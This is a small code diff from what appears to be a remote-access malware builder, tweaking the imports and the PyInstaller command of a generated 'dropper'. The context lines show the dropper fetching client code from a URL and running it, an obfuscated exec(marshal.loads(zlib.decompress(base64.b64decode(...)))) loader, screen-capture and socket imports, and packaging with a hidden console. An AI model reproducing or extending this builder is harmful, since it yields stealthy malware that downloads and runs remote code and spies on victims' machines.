@@ -232,7 +232,7 @@ def create_moduel(url):
   return module
 create_moduel(url+"client/client.py").run(url, file_path)"""
 
-        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,cv2,os
+        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,imageio,os
 from PIL import Image
 from urllib.request import urlopen
 
@@ -267,7 +267,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "Linux":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --collect-binaries=opencv-python --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
